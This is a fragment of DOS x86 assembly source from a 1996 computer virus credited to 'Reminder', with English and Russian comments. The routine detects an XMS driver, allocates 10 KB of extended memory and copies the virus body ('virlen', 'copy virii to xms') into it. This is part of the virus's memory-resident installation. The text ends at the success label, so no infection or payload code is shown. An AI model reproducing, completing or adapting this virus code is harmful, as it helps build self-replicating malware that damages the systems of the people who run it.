; (c) Reminder (1996)
;------------------------------- XMS ------------------------------------
init_xms:
mov ax,4300h
int 2fh					; is xms there ?

cmp al,80h
jnz bad_xms				; no, its sux

mov ax,4310h
int 2fh					; where entry point ?

mov word ptr ds:[xms_vect],bx
mov word ptr ds:[xms_vect+2],es		; is it

;-----------------------------------------------

mov ah,8	; сколько там памяти ?
call xms

cmp dx,10
jbe bad_xms	; меньше 10 кило ?

mov ah,9	; выделим 10 кил на игрушечки ;)
mov dx,10
call xms	
cmp ax,1	; 1 - ok  , 0 - failure 
jnz bad_xms

mov handle,dx
xor ax,ax
mov si,offset start

mov word ptr ds:[len_of_block],		virlen/2*2+2
mov word ptr ds:[handle_source],	ax
mov word ptr ds:[offset_source],	si
mov word ptr ds:[offset_source+2],	cs
mov word ptr ds:[handle_destination],	dx		; handle
mov word ptr ds:[offset_destination],	ax      	; 0
mov word ptr ds:[offset_destination+2],	ax    		; 0


mov ah,0bh
lea si,emm
call xms			; all ok	copy virii to xms
cmp ax,1
jnz bad_xms

xor ax,ax
mov dx,handle
mov word ptr ds:[offset_source],	ax
mov word ptr ds:[offset_source+2],	ax
mov word ptr ds:[handle_source],	dx
mov word ptr ds:[handle_destination],	ax

jmp short good_xms		; ;))

bad_xms:
mov al,7
int 29h

jmp restore

good_xms:
